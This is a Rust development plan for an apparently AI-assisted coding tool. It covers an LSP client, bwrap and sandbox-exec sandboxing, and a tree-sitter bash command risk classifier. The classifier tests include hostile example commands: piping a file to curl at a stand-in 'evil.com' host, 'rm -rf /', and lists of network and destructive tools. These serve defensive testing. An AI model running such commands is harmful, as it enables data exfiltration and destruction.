# Sprint 29: LSP Client, OS Sandbox, Terminal Security Classifier

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Add three new Rust crates — `ava-lsp` (LSP client with goto_definition, diagnostics streaming, zero-copy API), `ava-sandbox` (OS-level sandboxing for Linux/macOS with policy checks), and extend `ava-permissions` with a tree-sitter bash parser for terminal command risk classification — then wire them through Tauri command adapters.

**Architecture:** Each story maps to a crate boundary: `ava-lsp` owns the JSON-RPC transport and LSP protocol types (mirroring the TS `packages/extensions/lsp/` client); `ava-sandbox` owns OS abstraction for bwrap (Linux) and sandbox-exec (macOS); the terminal classifier lives in `ava-permissions` as a new `classifier` module since it directly extends the existing permission evaluation. All three use workspace conventions: `thiserror` errors, `tokio` async, `#[cfg(test)]` in-module tests, and thin Tauri command wrappers in `src-tauri/src/commands/`.

**Tech Stack:** Rust workspace crates, `lsp-types 0.97` (canonical LSP protocol types), `tokio` (async process IO / Content-Length framing), `tree-sitter 0.26` + `tree-sitter-bash 0.25` (AST-based command classification), `serde`/`serde_json`, `thiserror`.

---

## Implementation Order

```
Task 1: Scaffold crates + workspace wiring
Task 2: ava-lsp — transport (Content-Length framing over stdio)
Task 3: ava-lsp — client (initialize, shutdown, goto_definition, diagnostics stream)
Task 4: ava-sandbox — types + policy engine
Task 5: ava-sandbox — Linux bwrap backend
Task 6: ava-sandbox — macOS sandbox-exec backend
Task 7: ava-permissions — tree-sitter bash classifier
Task 8: Tauri command adapters for all three
Task 9: Full-sprint verification
```

---

### Task 1: Scaffold crates and workspace wiring

**Files:**
- Modify: `Cargo.toml` (workspace members)
- Modify: `src-tauri/Cargo.toml` (path deps)
- Create: `crates/ava-lsp/Cargo.toml`
- Create: `crates/ava-lsp/src/lib.rs`
- Create: `crates/ava-sandbox/Cargo.toml`
- Create: `crates/ava-sandbox/src/lib.rs`

**Step 1: Verify crates don't exist yet**

Run: `cargo test -p ava-lsp --no-run 2>&1`
Expected: FAIL with "package `ava-lsp` is not a member of the workspace"

**Step 2: Create `crates/ava-lsp/Cargo.toml`**

```toml
[package]
name = "ava-lsp"
version.workspace = true
edition.workspace = true
authors.workspace = true
license.workspace = true

[dependencies]
serde.workspace = true
serde_json.workspace = true
thiserror.workspace = true
tokio.workspace = true
futures.workspace = true
tokio-stream.workspace = true
lsp-types = "0.97"

[dev-dependencies]
tokio = { workspace = true, features = ["rt", "macros", "io-util", "process"] }
```

**Step 3: Create `crates/ava-lsp/src/lib.rs`**

Minimal stub with `pub fn healthcheck() -> bool { true }` and `#[cfg(test)]` block.

**Step 4: Create `crates/ava-sandbox/Cargo.toml`**

```toml
[package]
name = "ava-sandbox"
version.workspace = true
edition.workspace = true
authors.workspace = true
license.workspace = true

[dependencies]
serde.workspace = true
serde_json.workspace = true
thiserror.workspace = true
tokio.workspace = true

[dev-dependencies]
tokio = { workspace = true, features = ["rt", "macros"] }
```

**Step 5: Create `crates/ava-sandbox/src/lib.rs`**

Minimal stub with `pub fn healthcheck() -> bool { true }` and `#[cfg(test)]` block.

**Step 6: Add workspace deps for new external crates**

In root `Cargo.toml` `[workspace.dependencies]` add:
```toml
lsp-types = "0.97"
tree-sitter = "0.26"
tree-sitter-bash = "0.25"
```

**Step 7: Register workspace members**

In root `Cargo.toml` `[workspace] members` add `"crates/ava-lsp"` and `"crates/ava-sandbox"`.

**Step 8: Add path deps to `src-tauri/Cargo.toml`**

```toml
ava-lsp = { path = "../crates/ava-lsp" }
ava-sandbox = { path = "../crates/ava-sandbox" }
```

**Step 9: Add tree-sitter deps to `ava-permissions/Cargo.toml`**

```toml
tree-sitter = { workspace = true }
tree-sitter-bash = { workspace = true }
serde.workspace = true
serde_json.workspace = true
```

**Step 10: Verify compile**

Run: `cargo test -p ava-lsp -p ava-sandbox --no-run 2>&1`
Expected: Compiles successfully.

Run: `cargo check --workspace 2>&1`
Expected: PASS.

**Step 11: Commit**

```bash
git add Cargo.toml Cargo.lock src-tauri/Cargo.toml crates/ava-lsp crates/ava-sandbox crates/ava-permissions/Cargo.toml
git commit -m "feat(rust): scaffold ava-lsp and ava-sandbox crates for sprint 29"
```

---

### Task 2: ava-lsp — Transport (Content-Length framing)

**Files:**
- Create: `crates/ava-lsp/src/error.rs`
- Create: `crates/ava-lsp/src/transport.rs`
- Modify: `crates/ava-lsp/src/lib.rs`

**Step 1: Write failing tests for transport**

In `crates/ava-lsp/src/transport.rs`, add `#[cfg(test)] mod tests` with:

1. `test_encode_message` — verify `encode()` produces `Content-Length: N\r\n\r\n{json}` with byte-accurate length.
2. `test_decode_single_message` — feed a valid Content-Length frame into a `tokio::io::duplex` reader and verify `decode()` yields the correct `JsonRpcMessage`.
3. `test_decode_partial_then_complete` — send bytes in two chunks, verify the decoder waits for the full body before yielding.
4. `test_decode_back_to_back` — two messages concatenated, decoder yields both.

Run: `cargo test -p ava-lsp transport::tests -- --nocapture`
Expected: FAIL (module doesn't exist yet).

**Step 2: Create `crates/ava-lsp/src/error.rs`**

```rust
use thiserror::Error;

pub type Result<T> = std::result::Result<T, LspError>;

#[derive(Debug, Error)]
pub enum LspError {
    #[error("transport error: {0}")]
    Transport(String),
    #[error("protocol error: {0}")]
    Protocol(String),
    #[error("server not initialized")]
    NotInitialized,
    #[error("request timed out: {method} ({timeout_ms}ms)")]
    Timeout { method: String, timeout_ms: u64 },
    #[error("server error ({code}): {message}")]
    ServerError { code: i64, message: String },
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}
```

**Step 3: Implement transport types and codec**

In `crates/ava-lsp/src/transport.rs`:

- `JsonRpcMessage` struct (mirrors TS `LSPMessage`): `jsonrpc: &'static str`, `id: Option<i64>`, `method: Option<String>`, `params: Option<serde_json::Value>`, `result: Option<serde_json::Value>`, `error: Option<JsonRpcError>`.
- `JsonRpcError` struct: `code: i64`, `message: String`, `data: Option<serde_json::Value>`.
- `fn encode(msg: &JsonRpcMessage) -> Vec<u8>` — serialize to JSON, prepend `Content-Length: {byte_len}\r\n\r\n`.
- `struct FrameDecoder` wrapping a `tokio::io::BufReader<R>`:
  - `async fn next(&mut self) -> Result<Option<JsonRpcMessage>>` — read headers line-by-line until `\r\n`, parse `Content-Length`, read exactly N bytes, deserialize.
- Zero-copy note: the decoder reads into a reusable `Vec<u8>` buffer, only deserializing once.

**Step 4: Re-run tests**

Run: `cargo test -p ava-lsp transport::tests -- --nocapture`
Expected: PASS.

**Step 5: Commit**

```bash
git add crates/ava-lsp/src/
git commit -m "feat(ava-lsp): Content-Length framed JSON-RPC transport"
```

---

### Task 3: ava-lsp — Client (lifecycle + goto_definition + diagnostics stream)

**Files:**
- Create: `crates/ava-lsp/src/client.rs`
- Modify: `crates/ava-lsp/src/lib.rs`

**Step 1: Write failing tests for client**

In `crates/ava-lsp/src/client.rs`, add `#[cfg(test)] mod tests` with:

1. `test_initialize_handshake` — create a mock LSP server (tokio duplex pair), verify client sends `initialize` request and parses `InitializeResult`. Use `lsp_types::InitializeResult` for the mock response.
2. `test_goto_definition` — after mock initialize, call `client.goto_definition(uri, position)`, verify it returns `Vec<lsp_types::Location>` (normalize single-location and array responses).
3. `test_diagnostics_stream` — after initialize, push a `textDocument/publishDiagnostics` notification from mock server side, verify client's diagnostics receiver yields the correct `PublishDiagnosticsParams`.
4. `test_request_timeout` — mock server never responds, verify `LspError::Timeout` within configured duration.
5. `test_shutdown` — verify client sends `shutdown` request + `exit` notification.

Run: `cargo test -p ava-lsp client::tests -- --nocapture`
Expected: FAIL.

**Step 2: Implement `LspClient`**

```rust
pub struct LspClient {
    sender: mpsc::UnboundedSender<JsonRpcMessage>,
    pending: Arc<Mutex<HashMap<i64, oneshot::Sender<serde_json::Value>>>>,
    next_id: AtomicI64,
    diagnostics_tx: broadcast::Sender<lsp_types::PublishDiagnosticsParams>,
    initialized: AtomicBool,
    timeout_ms: u64,
}
```

Key methods:
- `async fn start(reader: R, writer: W, timeout_ms: u64) -> (Self, JoinHandle<()>)` — spawns read loop + write loop tasks.
- `async fn initialize(&self, root_uri: &str) -> Result<lsp_types::InitializeResult>` — sends initialize, waits, sends initialized notification.
- `async fn shutdown(&self) -> Result<()>` — sends shutdown, sends exit notification.
- `async fn goto_definition(&self, uri: &str, position: lsp_types::Position) -> Result<Vec<lsp_types::Location>>` — sends `textDocument/definition`, normalizes response.
- `fn diagnostics_stream(&self) -> broadcast::Receiver<lsp_types::PublishDiagnosticsParams>` — returns receiver for pushed diagnostics.
- `async fn request(&self, method: &str, params: serde_json::Value) -> Result<serde_json::Value>` — internal: sends request, waits with timeout.
- `async fn notify(&self, method: &str, params: serde_json::Value) -> Result<()>` — fire-and-forget.

The read loop dispatches: if `id` is present + no `method` → response (resolve pending); if `method` is present + no `id` → notification (route to diagnostics handler, etc.).

**Step 3: Re-run tests**

Run: `cargo test -p ava-lsp client::tests -- --nocapture`
Expected: PASS.

**Step 4: Update lib.rs exports**

```rust
pub mod error;
pub mod transport;
pub mod client;

pub use error::{LspError, Result};
pub use transport::JsonRpcMessage;
pub use client::LspClient;
```

**Step 5: Commit**

```bash
git add crates/ava-lsp/src/
git commit -m "feat(ava-lsp): LSP client with goto_definition and diagnostics stream"
```

---

### Task 4: ava-sandbox — Types and policy engine

**Files:**
- Create: `crates/ava-sandbox/src/error.rs`
- Create: `crates/ava-sandbox/src/types.rs`
- Create: `crates/ava-sandbox/src/policy.rs`
- Modify: `crates/ava-sandbox/src/lib.rs`

**Step 1: Write failing tests for policy evaluation**

In `crates/ava-sandbox/src/policy.rs`, add `#[cfg(test)] mod tests`:

1. `test_default_policy_denies_network` — default policy has `network_enabled: false`, verify.
2. `test_policy_allows_configured_mounts` — policy with mount paths allows those paths.
3. `test_policy_rejects_write_to_unmounted_path` — command writing to a path not in `mount_paths` is rejected by `policy.check_command()`.
4. `test_policy_enforces_memory_limit` — verify `max_memory_mb` is carried into command generation.
5. `test_policy_enforces_timeout` — verify timeout propagates.

Run: `cargo test -p ava-sandbox policy::tests -- --nocapture`
Expected: FAIL.

**Step 2: Create `crates/ava-sandbox/src/error.rs`**

```rust
use thiserror::Error;

pub type Result<T> = std::result::Result<T, SandboxError>;

#[derive(Debug, Error)]
pub enum SandboxError {
    #[error("sandbox not available: {0}")]
    NotAvailable(String),
    #[error("policy violation: {0}")]
    PolicyViolation(String),
    #[error("execution failed: {0}")]
    ExecutionFailed(String),
    #[error("timed out after {0}ms")]
    Timeout(u64),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}
```

**Step 3: Create `crates/ava-sandbox/src/types.rs`**

```rust
use serde::{Deserialize, Serialize};
use std::time::Duration;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SandboxConfig {
    pub timeout: Duration,
    pub max_memory_mb: u32,
    pub network_enabled: bool,
    pub mount_paths: Vec<String>,
}

impl Default for SandboxConfig {
    fn default() -> Self {
        Self {
            timeout: Duration::from_secs(60),
            max_memory_mb: 512,
            network_enabled: false,
            mount_paths: Vec::new(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SandboxResult {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub duration_ms: u64,
    pub timed_out: bool,
}
```

**Step 4: Create `crates/ava-sandbox/src/policy.rs`**

```rust
use crate::error::{Result, SandboxError};
use crate::types::SandboxConfig;

pub struct SandboxPolicy {
    config: SandboxConfig,
}

impl SandboxPolicy {
    pub fn new(config: SandboxConfig) -> Self {
        Self { config }
    }

    pub fn config(&self) -> &SandboxConfig {
        &self.config
    }

    /// Check if a command is allowed under this policy.
    /// Returns Ok(()) if allowed, Err(PolicyViolation) if not.
    pub fn check_command(&self, command: &str) -> Result<()> {
        // Reject commands that write to paths outside mounted dirs
        // (basic heuristic — real enforcement is in the OS sandbox)
        for token in command.split_whitespace() {
            if token.starts_with('/') && !self.is_path_mounted(token) {
                if self.looks_like_write_target(command, token) {
                    return Err(SandboxError::PolicyViolation(
                        format!("write to unmounted path: {token}")
                    ));
                }
            }
        }
        Ok(())
    }

    fn is_path_mounted(&self, path: &str) -> bool {
        self.config.mount_paths.iter().any(|mp| path.starts_with(mp.as_str()))
    }

    fn looks_like_write_target(&self, command: &str, path: &str) -> bool {
        // Heuristic: path appears after >, >>, tee, cp, mv, etc.
        let write_indicators = [">", ">>", "tee ", "cp ", "mv ", "install "];
        let before_path = &command[..command.find(path).unwrap_or(0)];
        write_indicators.iter().any(|w| before_path.ends_with(w) || before_path.contains(w))
    }
}
```

**Step 5: Re-run tests**

Run: `cargo test -p ava-sandbox policy::tests -- --nocapture`
Expected: PASS.

**Step 6: Update lib.rs**

```rust
pub mod error;
pub mod types;
pub mod policy;

pub use error::{SandboxError, Result};
pub use types::{SandboxConfig, SandboxResult};
pub use policy::SandboxPolicy;
```

**Step 7: Commit**

```bash
git add crates/ava-sandbox/src/
git commit -m "feat(ava-sandbox): types and policy engine for sandbox config"
```

---

### Task 5: ava-sandbox — Linux bwrap backend

**Files:**
- Create: `crates/ava-sandbox/src/linux.rs`
- Modify: `crates/ava-sandbox/src/lib.rs`

**Step 1: Write failing tests for bwrap command generation**

In `crates/ava-sandbox/src/linux.rs`, add `#[cfg(test)] mod tests`:

1. `test_build_bwrap_command_defaults` — default config produces command with `--die-with-parent --unshare-all --unshare-net --proc /proc --dev /dev --tmpfs /tmp`.
2. `test_build_bwrap_network_enabled` — when `network_enabled: true`, `--unshare-net` is absent.
3. `test_build_bwrap_mount_paths` — each mount in config appears as `--ro-bind "{path}" "{path}"`.
4. `test_build_bwrap_escapes_code` — single quotes in code are escaped.
5. `test_bwrap_available_check` — unit test with mock shell (just tests the function signature + return type).

Run: `cargo test -p ava-sandbox linux::tests -- --nocapture`
Expected: FAIL.

**Step 2: Implement Linux sandbox backend**

```rust
use crate::error::{Result, SandboxError};
use crate::policy::SandboxPolicy;
use crate::types::{SandboxConfig, SandboxResult};
use std::process::Stdio;
use tokio::process::Command;

pub fn build_bwrap_command(config: &SandboxConfig, code: &str) -> String {
    let escaped = code.replace('\'', "'\\''");
    let mut parts = vec![
        "bwrap".to_string(),
        "--die-with-parent".to_string(),
        "--unshare-all".to_string(),
    ];
    if !config.network_enabled {
        parts.push("--unshare-net".to_string());
    }
    parts.extend([
        "--proc".to_string(), "/proc".to_string(),
        "--dev".to_string(), "/dev".to_string(),
        "--tmpfs".to_string(), "/tmp".to_string(),
    ]);
    for mount in &config.mount_paths {
        parts.push(format!("--ro-bind"));
        parts.push(format!("\"{}\"", mount));
        parts.push(format!("\"{}\"", mount));
    }
    parts.push("sh".to_string());
    parts.push("-c".to_string());
    parts.push(format!("'{}'", escaped));
    parts.join(" ")
}

pub async fn is_bwrap_available() -> bool {
    Command::new("bwrap")
        .arg("--version")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .await
        .map(|s| s.success())
        .unwrap_or(false)
}

pub async fn run_bwrap(policy: &SandboxPolicy, code: &str) -> Result<SandboxResult> {
    policy.check_command(code)?;
    let config = policy.config();
    let command = build_bwrap_command(config, code);
    let start = std::time::Instant::now();

    let result = tokio::time::timeout(
        config.timeout,
        Command::new("sh").arg("-c").arg(&command).output()
    ).await;

    match result {
        Ok(Ok(output)) => Ok(SandboxResult {
            stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
            stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
            exit_code: output.status.code().unwrap_or(-1),
            duration_ms: start.elapsed().as_millis() as u64,
            timed_out: false,
        }),
        Ok(Err(e)) => Err(SandboxError::ExecutionFailed(e.to_string())),
        Err(_) => Ok(SandboxResult {
            stdout: String::new(),
            stderr: "Execution timed out".to_string(),
            exit_code: 124,
            duration_ms: start.elapsed().as_millis() as u64,
            timed_out: true,
        }),
    }
}
```

**Step 3: Re-run tests**

Run: `cargo test -p ava-sandbox linux::tests -- --nocapture`
Expected: PASS.

**Step 4: Commit**

```bash
git add crates/ava-sandbox/src/linux.rs crates/ava-sandbox/src/lib.rs
git commit -m "feat(ava-sandbox): Linux bwrap sandbox backend"
```

---

### Task 6: ava-sandbox — macOS sandbox-exec backend

**Files:**
- Create: `crates/ava-sandbox/src/macos.rs`
- Modify: `crates/ava-sandbox/src/lib.rs`

**Step 1: Write failing tests for sandbox-exec command generation**

In `crates/ava-sandbox/src/macos.rs`, add `#[cfg(test)] mod tests`:

1. `test_build_sandbox_exec_default_profile` — default config produces SBPL profile with `(deny default) (allow file-read*) (allow process*) (allow sysctl-read)`.
2. `test_build_sandbox_exec_network_enabled` — when `network_enabled: true`, profile includes `(allow network*)`.
3. `test_build_sandbox_exec_escapes_code` — single quotes in code are escaped.

Run: `cargo test -p ava-sandbox macos::tests -- --nocapture`
Expected: FAIL.

**Step 2: Implement macOS sandbox backend**

```rust
use crate::error::{Result, SandboxError};
use crate::policy::SandboxPolicy;
use crate::types::{SandboxConfig, SandboxResult};
use std::process::Stdio;
use tokio::process::Command;

pub fn build_sbpl_profile(config: &SandboxConfig) -> String {
    let mut rules = vec![
        "(version 1)".to_string(),
        "(deny default)".to_string(),
        "(allow file-read*)".to_string(),
        "(allow process*)".to_string(),
        "(allow sysctl-read)".to_string(),
    ];
    if config.network_enabled {
        rules.push("(allow network*)".to_string());
    }
    rules.join(" ")
}

pub fn build_sandbox_exec_command(config: &SandboxConfig, code: &str) -> String {
    let escaped = code.replace('\'', "'\\''");
    let profile = build_sbpl_profile(config);
    format!("sandbox-exec -p '{}' sh -c '{}'", profile, escaped)
}

pub async fn is_sandbox_exec_available() -> bool {
    Command::new("sandbox-exec")
        .arg("-n")
        .arg("no-network")
        .arg("true")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .await
        .map(|s| s.success())
        .unwrap_or(false)
}

pub async fn run_sandbox_exec(policy: &SandboxPolicy, code: &str) -> Result<SandboxResult> {
    policy.check_command(code)?;
    let config = policy.config();
    let command = build_sandbox_exec_command(config, code);
    let start = std::time::Instant::now();

    let result = tokio::time::timeout(
        config.timeout,
        Command::new("sh").arg("-c").arg(&command).output()
    ).await;

    match result {
        Ok(Ok(output)) => Ok(SandboxResult {
            stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
            stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
            exit_code: output.status.code().unwrap_or(-1),
            duration_ms: start.elapsed().as_millis() as u64,
            timed_out: false,
        }),
        Ok(Err(e)) => Err(SandboxError::ExecutionFailed(e.to_string())),
        Err(_) => Ok(SandboxResult {
            stdout: String::new(),
            stderr: "Execution timed out".to_string(),
            exit_code: 124,
            duration_ms: start.elapsed().as_millis() as u64,
            timed_out: true,
        }),
    }
}
```

**Step 3: Re-run tests**

Run: `cargo test -p ava-sandbox macos::tests -- --nocapture`
Expected: PASS.

**Step 4: Add `create_sandbox` factory in lib.rs**

Add a factory function that auto-selects backend based on `std::env::consts::OS`:

```rust
pub mod linux;
pub mod macos;

pub async fn create_sandbox(config: SandboxConfig) -> Result<Box<dyn SandboxBackend>> {
    let policy = SandboxPolicy::new(config);
    match std::env::consts::OS {
        "linux" => {
            if linux::is_bwrap_available().await {
                Ok(Box::new(BwrapSandbox { policy }))
            } else {
                Err(SandboxError::NotAvailable("bwrap not found".into()))
            }
        }
        "macos" => {
            if macos::is_sandbox_exec_available().await {
                Ok(Box::new(SandboxExecSandbox { policy }))
            } else {
                Err(SandboxError::NotAvailable("sandbox-exec not found".into()))
            }
        }
        os => Err(SandboxError::NotAvailable(format!("unsupported OS: {os}"))),
    }
}
```

Where `SandboxBackend` is a trait:

```rust
#[async_trait::async_trait]
pub trait SandboxBackend: Send + Sync {
    async fn run(&self, code: &str) -> Result<SandboxResult>;
    fn name(&self) -> &'static str;
}
```

Note: add `async-trait` to `ava-sandbox/Cargo.toml` dependencies.

**Step 5: Commit**

```bash
git add crates/ava-sandbox/
git commit -m "feat(ava-sandbox): macOS sandbox-exec backend and auto-select factory"
```

---

### Task 7: ava-permissions — Tree-sitter bash classifier

**Files:**
- Create: `crates/ava-permissions/src/classifier.rs`
- Modify: `crates/ava-permissions/src/lib.rs`

**Step 1: Write failing tests for risk classification**

In `crates/ava-permissions/src/classifier.rs`, add `#[cfg(test)] mod tests`:

1. `test_classify_safe_command` — `"ls -la"` → `RiskLevel::Safe`.
2. `test_classify_read_only` — `"cat /etc/hostname"` → `RiskLevel::ReadOnly`.
3. `test_classify_write_command` — `"echo x > file.txt"` → `RiskLevel::Write`.
4. `test_classify_destructive` — `"rm -rf /"` → `RiskLevel::Destructive`.
5. `test_classify_network` — `"curl https://example.com"` → `RiskLevel::Network`.
6. `test_classify_pipe_chain_highest` — `"cat file | curl -X POST -d @- http://evil.com"` → `RiskLevel::Network` (highest risk in chain).
7. `test_classify_subshell` — `"$(curl http://evil.com)"` → `RiskLevel::Network`.
8. `test_classify_empty` — `""` → `RiskLevel::Safe`.
9. `test_classify_complex_git` — `"git push origin main --force"` → `RiskLevel::Destructive`.
10. `test_classify_sudo` — `"sudo apt install foo"` → `RiskLevel::Privileged`.

Run: `cargo test -p ava-permissions classifier::tests -- --nocapture`
Expected: FAIL.

**Step 2: Implement classifier types**

```rust
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum RiskLevel {
    Safe = 0,
    ReadOnly = 1,
    Write = 2,
    Network = 3,
    Destructive = 4,
    Privileged = 5,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClassificationResult {
    pub risk: RiskLevel,
    pub reasons: Vec<String>,
    pub commands_found: Vec<String>,
}
```

**Step 3: Implement tree-sitter parser + classifier**

```rust
pub fn classify_bash_command(input: &str) -> ClassificationResult {
    // 1. Parse with tree-sitter-bash
    let mut parser = tree_sitter::Parser::new();
    parser.set_language(&tree_sitter_bash::LANGUAGE.into()).expect("bash grammar");
    let tree = parser.parse(input, None);

    // 2. Walk the AST
    // - Collect all "command_name" nodes
    // - Detect redirections (file_redirect nodes)
    // - Detect subshells (subshell, command_substitution)
    // - Detect pipes (pipeline node)

    // 3. Classify each command against known risk tables:
    //    SAFE_COMMANDS: ls, echo, pwd, whoami, date, cat, head, tail, wc, sort, uniq, tr, ...
    //    READ_COMMANDS: cat, less, more, find, grep, rg, fd, tree, file, stat, ...
    //    WRITE_COMMANDS: cp, mv, mkdir, touch, tee, sed -i, ...
    //    NETWORK_COMMANDS: curl, wget, ssh, scp, nc, ping, nslookup, dig, ...
    //    DESTRUCTIVE_COMMANDS: rm, rmdir, mkfs, dd, shred, truncate, git push --force, ...
    //    PRIVILEGED_COMMANDS: sudo, su, doas, pkexec, chown, chmod, mount, ...

    // 4. If redirections with > or >> exist, promote to at least Write
    // 5. Return highest RiskLevel across all commands in the pipeline
}
```

The key insight: unlike the existing `is_destructive_command()` / `is_network_command()` string-contains checks in `ava-permissions/src/lib.rs`, this classifier uses a proper AST, handling:
- Quoted arguments (not false-positived by `"rm"` appearing inside a string)
- Subshell expansion (`$(...)`, `` `...` ``)
- Pipeline risk escalation
- Redirect detection from the AST rather than string scanning

**Step 4: Re-run tests**

Run: `cargo test -p ava-permissions classifier::tests -- --nocapture`
Expected: PASS.

**Step 5: Integrate classifier into `PermissionSystem`**

In `crates/ava-permissions/src/lib.rs`, add to the `dynamic_check` method for `tool == "bash"`:

```rust
// Replace the string-based is_destructive_command / is_network_command
// with AST-based classifier when tree-sitter feature is available
if tool == "bash" {
    let command = args.first().ok_or("missing bash command")?;
    let classification = classifier::classify_bash_command(command);
    match classification.risk {
        RiskLevel::Destructive | RiskLevel::Privileged => return Ok(Some(Action::Deny)),
        RiskLevel::Network | RiskLevel::Write => return Ok(Some(Action::Ask)),
        _ => {}
    }
}
```

**Step 6: Re-run ALL permissions tests**

Run: `cargo test -p ava-permissions -- --nocapture`
Expected: PASS (both old tests and new classifier tests).

**Step 7: Commit**

```bash
git add crates/ava-permissions/src/
git commit -m "feat(ava-permissions): tree-sitter bash risk classifier"
```

---

### Task 8: Tauri command adapters

**Files:**
- Create: `src-tauri/src/commands/lsp.rs`
- Create: `src-tauri/src/commands/sandbox.rs`
- Create: `src-tauri/src/commands/classifier.rs`
- Modify: `src-tauri/src/commands/mod.rs`
- Modify: `src-tauri/src/lib.rs`

**Step 1: Implement `src-tauri/src/commands/lsp.rs`**

Three commands:
```rust
#[tauri::command]
pub async fn lsp_goto_definition(
    uri: String,
    line: u32,
    character: u32,
) -> Result<Vec<serde_json::Value>, String> {
    // TODO: actual LSP client management via AppState
    // For now: returns typed stub that validates serde contract
    Err("LSP client not connected".to_string())
}

#[tauri::command]
pub async fn lsp_get_diagnostics(uri: String) -> Result<Vec<serde_json::Value>, String> {
    Err("LSP client not connected".to_string())
}
```

Note: Full LSP client lifecycle management (start/stop server, maintain connection in AppState) is a follow-up; the sprint deliverable is the *crate API* and these thin command stubs that prove wiring.

**Step 2: Implement `src-tauri/src/commands/sandbox.rs`**

```rust
#[tauri::command]
pub async fn sandbox_run(
    code: String,
    timeout_secs: Option<u64>,
    network_enabled: Option<bool>,
    mount_paths: Option<Vec<String>>,
) -> Result<serde_json::Value, String> {
    let config = ava_sandbox::SandboxConfig {
        timeout: std::time::Duration::from_secs(timeout_secs.unwrap_or(60)),
        max_memory_mb: 512,
        network_enabled: network_enabled.unwrap_or(false),
        mount_paths: mount_paths.unwrap_or_default(),
    };
    let sandbox = ava_sandbox::create_sandbox(config).await.map_err(|e| e.to_string())?;
    let result = sandbox.run(&code).await.map_err(|e| e.to_string())?;
    serde_json::to_value(result).map_err(|e| e.to_string())
}
```

**Step 3: Implement `src-tauri/src/commands/classifier.rs`**

```rust
#[tauri::command]
pub fn classify_command(command: String) -> Result<serde_json::Value, String> {
    let result = ava_permissions::classifier::classify_bash_command(&command);
    serde_json::to_value(result).map_err(|e| e.to_string())
}
```

**Step 4: Register in mod.rs and lib.rs**

Add to `src-tauri/src/commands/mod.rs`:
```rust
mod lsp;
mod sandbox;
mod classifier;

pub use lsp::{lsp_goto_definition, lsp_get_diagnostics};
pub use sandbox::sandbox_run;
pub use classifier::classify_command;
```

Add to `src-tauri/src/lib.rs` imports and `generate_handler![]` list:
```rust
lsp_goto_definition,
lsp_get_diagnostics,
sandbox_run,
classify_command,
```

**Step 5: Verify compile**

Run: `cargo check --manifest-path src-tauri/Cargo.toml 2>&1`
Expected: PASS (the tauri binary includes all new deps and commands).

**Step 6: Commit**

```bash
git add src-tauri/src/commands/ src-tauri/src/lib.rs
git commit -m "feat(tauri): wire lsp, sandbox, and classifier commands"
```

---

### Task 9: Full-sprint verification and review

**Files:** None (verification only).

**Step 1: Run full workspace test suite**

Run: `cargo test --workspace 2>&1`
Expected: PASS for all crates.

**Step 2: Run clippy**

Run: `cargo clippy --workspace --all-targets -- -D warnings 2>&1`
Expected: PASS (no warnings).

**Step 3: Run fmt check**

Run: `cargo fmt --all -- --check 2>&1`
Expected: PASS.

**Step 4: Verify Tauri app builds**

Run: `cargo check --manifest-path src-tauri/Cargo.toml 2>&1`
Expected: PASS.

**Step 5: Summary of acceptance criteria met**

| Story | Acceptance Criteria | Verification |
|-------|-------------------|--------------|
| 2.7 LSP Client | `goto_definition(uri, position) -> Vec<Location>` | `cargo test -p ava-lsp client::tests::test_goto_definition` |
| 2.7 LSP Client | Diagnostics stream (push-based) | `cargo test -p ava-lsp client::tests::test_diagnostics_stream` |
| 2.7 LSP Client | Zero-copy transport (reusable buffer) | `cargo test -p ava-lsp transport::tests` |
| 2.8 OS Sandbox | Linux bwrap abstraction | `cargo test -p ava-sandbox linux::tests` |
| 2.8 OS Sandbox | macOS sandbox-exec abstraction | `cargo test -p ava-sandbox macos::tests` |
| 2.8 OS Sandbox | Policy checks before execution | `cargo test -p ava-sandbox policy::tests` |
| 2.9 Classifier | tree-sitter bash parsing | `cargo test -p ava-permissions classifier::tests` |
| 2.9 Classifier | Risk classification (Safe→Privileged) | All 10 classifier tests |
| 2.9 Classifier | Integration with PermissionSystem | `cargo test -p ava-permissions` |

**Step 6: Final commit**

```bash
git add -A
git commit -m "chore(rust): finalize sprint 29 — lsp, sandbox, classifier"
```

---

## Dependency Summary

### New workspace dependencies (root `Cargo.toml`)

```toml
lsp-types = "0.97"
tree-sitter = "0.26"
tree-sitter-bash = "0.25"
```

### New crates

| Crate | Direct deps | Purpose |
|-------|------------|---------|
| `ava-lsp` | serde, serde_json, thiserror, tokio, futures, tokio-stream, lsp-types | LSP client transport + protocol |
| `ava-sandbox` | serde, serde_json, thiserror, tokio, async-trait | OS sandbox abstraction |

### Modified crates

| Crate | Added deps | Purpose |
|-------|-----------|---------|
| `ava-permissions` | tree-sitter, tree-sitter-bash, serde, serde_json | Bash AST classifier |

---

## Risk Assessment

| Risk | Severity | Mitigation |
|------|----------|------------|
| tree-sitter C compilation slows CI | Medium | tree-sitter-bash is precompiled grammar; builds are cached after first pass |
| `lsp-types` version mismatch with actual LSP servers | Low | Using 0.97 which tracks LSP 3.17 spec; most servers target this |
| bwrap unavailable in CI | Medium | All bwrap/sandbox-exec tests only verify *command generation* (pure functions), not execution; execution tests are `#[ignore]` |
| sandbox-exec deprecated on newer macOS | Low | Documented in code; still functional through macOS 15 |
| `async-trait` in sandbox backend trait | Low | Standard pattern in workspace (already used by `ava-platform`) |
